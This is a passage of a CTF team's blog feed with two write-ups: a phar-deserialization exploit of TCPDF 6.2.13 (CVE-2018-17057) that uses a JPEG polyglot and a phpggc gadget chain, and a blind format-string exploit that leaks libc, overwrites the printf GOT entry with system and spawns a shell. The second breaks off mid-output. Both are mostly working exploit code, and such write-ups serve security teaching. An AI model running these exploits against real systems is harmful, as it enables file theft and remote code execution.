    <content type="html"><![CDATA[<blockquote><p><strong>Description</strong>:<br>116</p><p>Written by: 0x4d5a</p><p>A pdf conversion service. What could go wrong?</p><p>hax.allesctf.net:3333</p><p><a href="https://mega.nz/#!Gm4GjSxT!w31l60yP_l3EcW7osHu6CfGcTttqhFDt8BgJuAJUP78" target="_blank" rel="noopener">code.zip</a></p></blockquote><h3 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h3><p>A website that converts editable content into a pdf, it uses a known tool named tcpdf , since the source code is given lets check its version at <strong>TCPDF/tcpdf.php</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ cat pdfcreator/TCPDF/tcpdf.php | head -10</span><br><span class="line">&lt;?php</span><br><span class="line">//============================================================+</span><br><span class="line">// File name   : tcpdf.php</span><br><span class="line">// Version     : 6.2.13</span><br><span class="line">// Begin       : 2002-08-03</span><br><span class="line">// Last Update : 2015-06-18</span><br><span class="line">// Author      : Nicola Asuni - Tecnick.com LTD - www.tecnick.com - info@tecnick.com</span><br><span class="line">// License     : GNU-LGPL v3 (http://www.gnu.org/copyleft/lesser.html)</span><br><span class="line">// -------------------------------------------------------------------</span><br><span class="line">// Copyright (C) 2002-2015 Nicola Asuni - Tecnick.com LTD</span><br></pre></td></tr></table></figure><p>The version is <strong>6.2.13</strong> searching online for known vulnerabilities <a href="https://www.cvedetails.com/cve/CVE-2018-17057/" target="_blank" rel="noopener">https://www.cvedetails.com/cve/CVE-2018-17057/</a> :</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">An issue was discovered in TCPDF before 6.2.22. </span><br><span class="line">Attackers can trigger unserialization of arbitrary data via the phar:// wrapper.</span><br></pre></td></tr></table></figure><p>So it’s possible possible to perform an unserialization attack using <strong>phar://wrapper</strong> wrappers, the deserialization is triggered on functions like <strong>file_exists</strong> (line 164), <strong>getimagesize()</strong> (line 171) and <strong>file_get_contents()</strong> (line 209) in the file <strong>pdfcreator/TCPDF/include/tcpdf_images.php</strong>:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">.... <span class="comment">// pdfcreator/TCPDF/include/tcpdf_images.php</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">_parsejpeg</span><span class="params">($file)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// check if is a local file</span></span><br><span class="line">    <span class="keyword">if</span> (!@file_exists($file)) &#123;</span><br><span class="line">        <span class="comment">// try to encode spaces on filename</span></span><br><span class="line">        $tfile = str_replace(<span class="string">' '</span>, <span class="string">'%20'</span>, $file);</span><br><span class="line">        <span class="keyword">if</span> (@file_exists($tfile)) &#123;</span><br><span class="line">        $   file = $tfile;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">....</span><br></pre></td></tr></table></figure><p>This unserialization only occurs when using <strong>phar://</strong> wrappers, but we can’t straightly upload a phar file because of the checks presented in <strong>index.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">.... <span class="comment">// pdfcreator/index.php</span></span><br><span class="line">    $allowed_extensions = <span class="keyword">array</span>(<span class="string">'png'</span>, <span class="string">'jpg'</span>, <span class="string">'jpeg'</span>, <span class="string">'gif'</span>);</span><br><span class="line">    <span class="keyword">if</span>(!in_array($extension, $allowed_extensions)) &#123;</span><br><span class="line">     <span class="keyword">die</span>(<span class="string">"&lt;div class=\"container\"&gt;Invalid image extension!&lt;/div&gt;"</span>);</span><br><span class="line">     <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">....</span><br><span class="line">    <span class="comment">//Überprüfung dass das Bild keine Fehler enthält</span></span><br><span class="line">    <span class="keyword">if</span>(function_exists(<span class="string">'exif_imagetype'</span>)) &#123; <span class="comment">//Die exif_imagetype-Funktion erfordert die exif-Erweiterung auf dem Server</span></span><br><span class="line">     $allowed_types = <span class="keyword">array</span>(IMAGETYPE_PNG, IMAGETYPE_JPEG, IMAGETYPE_GIF);</span><br><span class="line">     $detected_type = exif_imagetype($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>]);</span><br><span class="line">     </span><br><span class="line">     </span><br><span class="line">     <span class="keyword">if</span>(!in_array($detected_type, $allowed_types)) &#123;</span><br><span class="line">     <span class="keyword">echo</span>(<span class="string">"&lt;div class=\"container\"&gt;Only pictures allowed!&lt;/div&gt;"</span>);</span><br><span class="line">     <span class="keyword">return</span>;</span><br><span class="line">     &#125;</span><br><span class="line">    &#125;</span><br><span class="line">....</span><br></pre></td></tr></table></figure><p>This checks can be easily bypassed, the first check can easily bypassed by changing filename from exploit.phar to exploit.jpg.</p><p>The second check only checks the header we can easily append to our <strong>phar</strong> file a jpg header before our phar file. The objective is to unserialize a php class that can gives us <strong>RCE</strong> or a <strong>fileread</strong> of file flag.php, there is a good class we can use for this:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// pdfcreator/creator.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">PDFStuff</span></span><br><span class="line">&#123;</span><br><span class="line">include 'TCPDF/tcpdf.php';</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PDFCreator</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">   <span class="keyword">public</span> $tmpfile;</span><br><span class="line">   <span class="keyword">public</span> $finalfile;</span><br><span class="line">   </span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">   </span><br><span class="line">   &#125;</span><br><span class="line">   ...</span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">      <span class="keyword">if</span> (file_exists(<span class="keyword">$this</span>-&gt;tmpfile))</span><br><span class="line">      &#123;</span><br><span class="line">        $info = pathinfo(<span class="keyword">$this</span>-&gt;tmpfile);</span><br><span class="line">        <span class="keyword">if</span> ($info[<span class="string">'extension'</span>] == <span class="string">"pdf"</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            unlink(<span class="keyword">$this</span>-&gt;tmpfile);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"Could not delete created PDF: Not a pdf. Check the file: "</span> . file_get_contents(<span class="keyword">$this</span>-&gt;tmpfile);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h3><p>We want to trigger functions like <strong>__construct</strong> or <strong>__destruct</strong> after object deserialization, <strong>__construct</strong> is empty so it’s not useful but <strong>__destruct</strong> is! </p><p>It can give us a <strong>file_read</strong> which is enough for what we need, but for this we need to change tmpfile variable to <strong>./flag.php</strong> making the extesion to be diferent from <strong>pdf</strong> reading the file content instead. </p><p>I tried to manually create the phar file but failed miserly, while debugging locally with I was having some troubles passing through the function <strong>getimagesize</strong> due to some errors on jpg signatures eventually I managed to solve the problem but in the end the <strong>function __destruct</strong> was not triggering and I ended up giving up. </p><p>Eventually I found <a href="https://github.com/ambionics/phpggc" target="_blank" rel="noopener">phpggc</a> which can create for us the fake jpg file with the phar embed on it, we just need to create our own template for this:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ git <span class="built_in">clone</span> https://github.com/ambionics/phpggc</span><br><span class="line">$ <span class="built_in">cd</span> phpggc</span><br><span class="line">$ mkdir gadgetchains/Alles/ &amp;&amp; mkdir gadgetchains/Alles/FR &amp;&amp; mkdir gadgetchains/Alles/FR/1</span><br><span class="line">$ cp templates/* gadgetchains/Alles/FR/1/*</span><br></pre></td></tr></table></figure><p>Modifying the <strong>chain.php</strong> at <strong>gadgetchains/Alles/FR/1/</strong>:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">PDFStuff</span> &#123;</span><br><span class="line">  <span class="title">class</span> <span class="title">PDFCreator</span> &#123; <span class="title">public</span> $<span class="title">tmpfile</span>; &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">GadgetChain</span>\<span class="title">Alles</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">FR1</span> <span class="title">extends</span> \<span class="title">PHPGGC</span>\<span class="title">GadgetChain</span>\<span class="title">FileRead</span> &#123;</span><br><span class="line">        public static $version = '1.00';</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> $vector = <span class="string">'__destruct'</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> $author = <span class="string">'teamrocketist'</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">generate</span><span class="params">(array $parameters)</span> </span>&#123;</span><br><span class="line">            $a = <span class="keyword">new</span> \PDFStuff\PDFCreator();</span><br><span class="line">            $a-&gt;tmpfile = $parameters[<span class="string">"remote_file"</span>]; <span class="comment">// file to read</span></span><br><span class="line">            <span class="keyword">return</span> $a;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Generating the payload with <strong>phpggc</strong>:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./phpggc Alles/FR1 flag.php -f -pj ../dummy.jpg -o ../exploit.jpg</span><br></pre></td></tr></table></figure></p><p>The option -f uses a technique named <a href="https://github.com/ambionics/phpggc#fast-destruct" target="_blank" rel="noopener">fast destructor</a> to make sure the object deserialized triggers <strong>__destruct</strong>, option <strong>-pj</strong> is to create a jpeg-phar from sample <strong>dummy.jpg</strong>(any valid jpg works) the one I used was this <a href="https://mega.nz/#!qnxylKJQ!QjpxDQP2eOkQGxny-SQ977FCrAp5DTjzNFqfihhPCh4" target="_blank" rel="noopener">one</a>, <strong>-o</strong> option is to specify the output of the payload to a file location.</p><p>After uploading the file make sure you modify the img html tag to use phar:// wrappers:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"phar://./upload/708697c63f7eb369319c6523380bdf7a_6.jpg"</span> <span class="attr">width</span>=<span class="string">"10"</span> <span class="attr">height</span>=<span class="string">"10"</span>&gt;</span></span><br></pre></td></tr></table></figure><p>Finally writing a python script to automate this actions:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">files = &#123;<span class="string">'file'</span>: open(<span class="string">'exploit.jpg'</span>,<span class="string">'rb'</span>)&#125;</span><br><span class="line">url = <span class="string">'http://hax.allesctf.net:3333/index.php'</span></span><br><span class="line">values = &#123;<span class="string">"filename"</span>:<span class="string">"exploit.jpg"</span>, <span class="string">"Content-Disposition"</span>:<span class="string">"form-data"</span>, <span class="string">"Content-Type"</span>:<span class="string">"image/jpeg"</span>&#125;</span><br><span class="line">r = requests.post(url, files=files, data=values)</span><br><span class="line">file_link = re.findall(<span class="string">r'src="(.*)"'</span>,r.text)[<span class="number">0</span>]</span><br><span class="line">img = <span class="string">'&lt;img src="phar://./%s" width="10" height="10"&gt;'</span></span><br><span class="line"><span class="keyword">print</span> re.findall(<span class="string">r'ALLES&#123;.*&#125;'</span>, requests.post(url, data=&#123;<span class="string">'pdfcontent'</span>:img%file_link&#125;).text)[<span class="number">0</span>]</span><br></pre></td></tr></table></figure><p>Running and getting the flag:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ python webPwn.py</span><br><span class="line">ALLES&#123;phar_jpeg_polyglot_madness_such_w0w&#125;</span><br></pre></td></tr></table></figure><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Description&lt;/strong&gt;:&lt;br&gt;116&lt;/p&gt;
&lt;p&gt;Written by: 0x4d5a&lt;/p&gt;
&lt;p&gt;A pdf conversion service. What could go wrong?&lt;/p&gt;
&lt;p&gt;
      
    
    </summary>
    
      <category term="Web" scheme="https://teamrocketist.github.io/categories/Web/"/>
    
    
      <category term="ccc2019ctf" scheme="https://teamrocketist.github.io/tags/ccc2019ctf/"/>
    
      <category term="unserialization" scheme="https://teamrocketist.github.io/tags/unserialization/"/>
    
      <category term="php" scheme="https://teamrocketist.github.io/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>[Pwn] RedpwnCTF - Black Echo</title>
    <link href="https://teamrocketist.github.io/2019/08/17/Pwn-RedpwnCTF-Black-Echo/"/>
    <id>https://teamrocketist.github.io/2019/08/17/Pwn-RedpwnCTF-Black-Echo/</id>
    <published>2019-08-17T05:12:40.000Z</published>
    <updated>2019-08-17T05:30:00.462Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>Black Echo</p></blockquote><blockquote><p><strong>Description</strong>:<br>413</p><p>Written by: blevy</p><p>You are trapped in a pitch-black cave with no food, water, flashlight, or self-esteem. A faint echo can be heard in the distance.</p><p>nc chall2.2019.redpwn.net 4007</p></blockquote><h3 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h3><p>No binary was provided in this challenge, but it was easy to note that there was a format string vulnerability:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ nc chall2.2019.redpwn.net 4007</span><br><span class="line">%p</span><br><span class="line">0x1000</span><br></pre></td></tr></table></figure><p>Without the binary we can’t get the got addresses required to leak libc, but we can get the binary from memory, I used an old x86 binary from a previous challenge to check what was the default address:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; info proc mappings </span><br><span class="line">process 26806</span><br><span class="line">Mapped address spaces:</span><br><span class="line"></span><br><span class="line">Start Addr   End Addr       Size     Offset objfile</span><br><span class="line"> 0x8048000  0x8049000     0x1000        0x0 /ctf/redpwn/hardmode/hardmode</span><br><span class="line"> 0x8049000  0x804a000     0x1000        0x0 /ctf/redpwn/hardmode/hardmode</span><br><span class="line"> 0x804a000  0x804b000     0x1000     0x1000 /ctf/redpwn/hardmode/hardmode</span><br><span class="line">0xf7db4000 0xf7f8b000   0x1d7000        0x0 /lib/i386-linux-gnu/libc-2.28.so</span><br><span class="line">0xf7f8b000 0xf7f8c000     0x1000   0x1d7000 /lib/i386-linux-gnu/libc-2.28.so</span><br><span class="line">0xf7f8c000 0xf7f8e000     0x2000   0x1d7000 /lib/i386-linux-gnu/libc-2.28.so</span><br><span class="line">0xf7f8e000 0xf7f8f000     0x1000   0x1d9000 /lib/i386-linux-gnu/libc-2.28.so</span><br><span class="line">0xf7f8f000 0xf7f92000     0x3000        0x0 </span><br><span class="line">0xf7fcd000 0xf7fcf000     0x2000        0x0 </span><br><span class="line">0xf7fcf000 0xf7fd2000     0x3000        0x0 [vvar]</span><br><span class="line">0xf7fd2000 0xf7fd4000     0x2000        0x0 [vdso]</span><br><span class="line">0xf7fd4000 0xf7ffb000    0x27000        0x0 /lib/i386-linux-gnu/ld-2.28.so</span><br><span class="line">0xf7ffc000 0xf7ffd000     0x1000    0x27000 /lib/i386-linux-gnu/ld-2.28.so</span><br><span class="line">0xf7ffd000 0xf7ffe000     0x1000    0x28000 /lib/i386-linux-gnu/ld-2.28.so</span><br><span class="line">0xfffdd000 0xffffe000    0x21000        0x0 [stack]</span><br></pre></td></tr></table></figure><p>We can start leaking from <strong>0x8049000</strong> until <strong>0x804b000</strong>, the starting of <strong>0x8048000</strong>-<strong>0x8049000</strong> is just a repetition from <strong>0x8049000</strong>-<strong>0x804a000</strong>, there is also something you should worry about, addresses that contains 0x0a (new line ‘\n’) bytes can’t be leaked, because the function used to read is <strong>fgets</strong> and it stops reading when it encounters new lines, in this cases I just insert a null byte, in the end is expected the binary to be slightly corrupted. If you want more details liveoverflow did a video about an identical challenge on his youtube channel around 2017 you can visit at <a href="https://www.youtube.com/watch?v=XuzuFUGuQv0" target="_blank" rel="noopener">https://www.youtube.com/watch?v=XuzuFUGuQv0</a></p><p>The code to leak the binary:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">binary = <span class="string">''</span></span><br><span class="line">out = <span class="string">''</span></span><br><span class="line">x=0x8049000</span><br><span class="line"><span class="keyword">while</span> x &lt; 0x8049000+0x2000:</span><br><span class="line">address = <span class="string">"0%x"</span> % x</span><br><span class="line">length = 0</span><br><span class="line"><span class="built_in">print</span> address</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="string">'\n'</span> <span class="keyword">in</span> binascii.unhexlify(address)):</span><br><span class="line"><span class="comment">#length = 1</span></span><br><span class="line">out = <span class="string">'a'</span></span><br><span class="line">binary += <span class="string">'\x00'</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">r.sendline(<span class="string">"%9<span class="variable">$s</span>"</span>+<span class="string">"||||"</span>+p32(x))</span><br><span class="line">out = r.recvuntil(<span class="string">'||||'</span>)</span><br><span class="line"><span class="built_in">print</span> out</span><br><span class="line">r.recv(timeout=1)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">'-----'</span></span><br><span class="line">out = out.replace(<span class="string">'||||'</span>,<span class="string">''</span>)</span><br><span class="line"><span class="comment">#print out</span></span><br><span class="line"><span class="comment">#length = count_until(out)</span></span><br><span class="line"><span class="keyword">if</span> out == <span class="string">''</span>:</span><br><span class="line">out = <span class="string">'a'</span></span><br><span class="line">binary += <span class="string">'\x00'</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">binary += out</span><br><span class="line">with open(<span class="string">'gotcha2.elf'</span>,<span class="string">'wb+'</span>) as f:</span><br><span class="line">f.write(binary)</span><br><span class="line">x += len(out)</span><br></pre></td></tr></table></figure></p><p><a data-fancybox="gallery" href="https://i.imgur.com/zlzVC2u.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/zlzVC2u.png" alt><br></a></p><p>They binary is somehow corrupted as expected but it’s still possible to deduce which libc addresses are in there, as you can see in the picture above, right above extern functions you have some libc addresses, they look like they are from the GOT, with some trial and error I manged to which they belong by using libc-database (<a href="https://github.com/niklasb/libc-database)" target="_blank" rel="noopener">https://github.com/niklasb/libc-database)</a>.</p><p>First trying o find <strong>fgets</strong>:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">./find fgets 0xF7FCD918</span><br><span class="line">$ ./find fgets 0xF7FBDFE0</span><br><span class="line">$ ./find fgets 0xF7E54450</span><br><span class="line">$ ./find fgets 0xF7E38020</span><br><span class="line">$ ./find fgets 0xF7E4C620</span><br><span class="line">ubuntu-xenial-amd64-libc6-i386 (id libc6-i386_2.23-0ubuntu10_amd64)</span><br><span class="line">archive-glibc (id libc6-i386_2.23-0ubuntu11_amd64)</span><br><span class="line">ubuntu-xenial-amd64-libc6-i386 (id libc6-i386_2.23-0ubuntu9_amd64)</span><br></pre></td></tr></table></figure><p>libc ID is <strong>libc6-i386_2.23-0ubuntu10_amd64</strong>, we now know which libc is and fgets got address is <strong>0x804A014</strong>:<br><a data-fancybox="gallery" href="https://i.imgur.com/aPC1BSA.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/aPC1BSA.png" alt><br></a></p><p>Doing the same thing for printf you would end up finding the same:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">./find <span class="built_in">printf</span> 0xF7E38020</span><br><span class="line">archive-old-eglibc (id libc6-i386_2.11.1-0ubuntu7.11_amd64)</span><br><span class="line">ubuntu-xenial-amd64-libc6-i386 (id libc6-i386_2.23-0ubuntu10_amd64)</span><br><span class="line">archive-glibc (id libc6-i386_2.23-0ubuntu11_amd64)</span><br><span class="line">ubuntu-xenial-amd64-libc6-i386 (id libc6-i386_2.23-0ubuntu9_amd64)</span><br></pre></td></tr></table></figure><p>Printf got address is <strong>0x804a010</strong>:<br><a data-fancybox="gallery" href="https://i.imgur.com/LfnRAXv.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/LfnRAXv.png" alt><br></a></p><p>Now it’s a matter of leaking libc by leaking <strong>fgets</strong> from GOT and overwriting got address of printf into system with format string:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">'libc.so.6'</span>)</span><br><span class="line">host,port = <span class="string">'chall.2019.redpwn.net'</span>,<span class="string">'4007'</span></span><br><span class="line">r = remote(host,port)</span><br><span class="line"></span><br><span class="line">FGETS_GOT = <span class="number">0x804A014</span></span><br><span class="line">PRINTF_GOT = <span class="number">0x804A010</span></span><br><span class="line">r.sendline(<span class="string">"%8$s"</span>+p32(PRINTF_GOT))</span><br><span class="line"></span><br><span class="line">PRINTF = u32(r.recv(<span class="number">4</span>))</span><br><span class="line">LIBC_BASE = PRINTF - libc.symbols[<span class="string">'printf'</span>]</span><br><span class="line">SYSTEM = LIBC_BASE + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">FGETS = LIBC_BASE + libc.symbols[<span class="string">'fgets'</span>]</span><br><span class="line">GETS = LIBC_BASE + libc.symbols[<span class="string">'gets'</span>]</span><br><span class="line">PUTS = LIBC_BASE + libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line">log.info(<span class="string">"LIBCBASE 0x%x"</span>%LIBC_BASE)</span><br><span class="line">log.info(<span class="string">"PRINTF 0x%x"</span>%PRINTF)</span><br><span class="line">log.info(<span class="string">"SYSTEM 0x%x"</span>%SYSTEM)</span><br><span class="line">log.info(<span class="string">"FGETS 0x%x"</span>%FGETS)</span><br><span class="line">log.info(<span class="string">"STDOUT 0x%x"</span>%(LIBC_BASE+libc.symbols[<span class="string">'stdout'</span>]))</span><br><span class="line">log.info(<span class="string">"STDIN 0x%x"</span>%(LIBC_BASE+libc.symbols[<span class="string">'stdin'</span>]))</span><br><span class="line">log.info(<span class="string">"SETBUFF 0x%x"</span>%(LIBC_BASE+libc.symbols[<span class="string">'setbuf'</span>]))</span><br><span class="line">log.info(<span class="string">"STDERR 0x%x"</span>%(LIBC_BASE+libc.symbols[<span class="string">'stderr'</span>]))</span><br><span class="line">log.info(<span class="string">"PUTS 0x%x"</span>%(LIBC_BASE+libc.symbols[<span class="string">'puts'</span>]))</span><br><span class="line"></span><br><span class="line"><span class="comment">#SYSTEM = 0xcafebabe</span></span><br><span class="line"></span><br><span class="line">FLAG_LOW = SYSTEM &amp; <span class="number">0xffff</span></span><br><span class="line">FLAG_HIGH = (SYSTEM &amp; <span class="number">0xffff0000</span>) &gt;&gt; <span class="number">16</span></span><br><span class="line"></span><br><span class="line">s = <span class="string">''</span></span><br><span class="line">s += p32(PRINTF_GOT)</span><br><span class="line">s += p32(PRINTF_GOT+<span class="number">2</span>)</span><br><span class="line">s += <span class="string">'%7$ln'</span> <span class="comment"># clears the already existing got address</span></span><br><span class="line">s += <span class="string">'%&#123;&#125;x%7$hn'</span>.format(FLAG_LOW<span class="number">-0x8</span>)</span><br><span class="line">s += <span class="string">'%&#123;&#125;x%8$hn'</span>.format(FLAG_HIGH-FLAG_LOW)</span><br><span class="line">r.sendline(s)</span><br><span class="line">r.recv()</span><br><span class="line">r.sendline(<span class="string">"/bin/sh\x00"</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>Running it:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">$ python blackecho.py </span><br><span class="line">[*] <span class="string">'/ctf/work/blackecho/libc.so.6'</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    